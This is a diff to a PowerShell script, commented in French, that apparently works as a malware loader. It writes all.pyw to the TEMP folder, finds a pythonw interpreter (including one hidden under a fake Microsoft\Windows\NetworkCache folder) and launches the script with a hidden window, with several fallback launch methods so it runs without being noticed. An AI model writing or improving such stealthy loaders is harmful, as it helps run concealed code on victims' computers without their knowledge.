@@ -8,6 +8,42 @@ function Report-Error($msg) {
     } catch {}
 }
 
+function Resolve-Pythonw {
+    # 1) pythonw.exe du PATH
+    try {
+        $cmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
+        if ($cmd -and $cmd.Source -and (Test-Path $cmd.Source)) {
+            return $cmd.Source
+        }
+    } catch {}
+
+    # 2) Python embarqué dans NetworkCache
+    $embedded = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\NetworkCache\Python310\pythonw.exe'
+    if (Test-Path $embedded) {
+        return $embedded
+    }
+
+    # 3) Autres emplacements connus (fallback)
+    $candidates = @(
+        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python310\pythonw.exe'),
+        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python311\pythonw.exe'),
+        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python312\pythonw.exe'),
+        'C:\Python310\pythonw.exe',
+        'C:\Python311\pythonw.exe',
+        'C:\Python312\pythonw.exe',
+        'C:\Program Files\Python310\pythonw.exe',
+        'C:\Program Files\Python311\pythonw.exe',
+        'C:\Program Files\Python312\pythonw.exe'
+    )
+    foreach ($c in $candidates) {
+        if ($c -and (Test-Path $c)) {
+            return $c
+        }
+    }
+
+    return $null
+}
+
 try {
     $tmp = Join-Path $env:TEMP 'all.pyw'
 
@@ -31,25 +67,32 @@ try {
         $isAdmin = $false
     }
 
-    # Étape 3 : lancement pythonw (sans UAC, fenêtre cachée)
+    # Étape 3 : résolution de pythonw.exe (PATH puis NetworkCache puis fallbacks)
+    $pythonw = Resolve-Pythonw
+    if (-not $pythonw) {
+        Report-Error "pythonw.exe introuvable (ni PATH, ni NetworkCache, ni emplacements standards)"
+        exit 1
+    }
+
+    # Étape 4 : lancement caché via pythonw
     try {
         $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = 'pythonw.exe'
+        $psi.FileName = $pythonw
         $psi.Arguments = '"' + $tmp + '"'
         $psi.UseShellExecute = $false
         $psi.CreateNoWindow = $true
         $psi.WindowStyle = 'Hidden'
         [System.Diagnostics.Process]::Start($psi) | Out-Null
     } catch {
-        # Fallback 1 : Start-Process direct
+        # Fallback : Start-Process direct
         try {
-            Start-Process -FilePath 'pythonw.exe' -ArgumentList @($tmp) -WindowStyle Hidden
+            Start-Process -FilePath $pythonw -ArgumentList @($tmp) -WindowStyle Hidden
         } catch {
-            # Fallback 2 : Start-Process sur le .pyw
+            # Dernier recours : lancer le .pyw directement
             try {
                 Start-Process -FilePath $tmp -WindowStyle Hidden
             } catch {
-                Report-Error "Impossible de lancer all.pyw : $($_.Exception.Message)"
+                Report-Error "Impossible de lancer all.pyw avec $pythonw : $($_.Exception.Message)"
                 exit 1
             }
         }
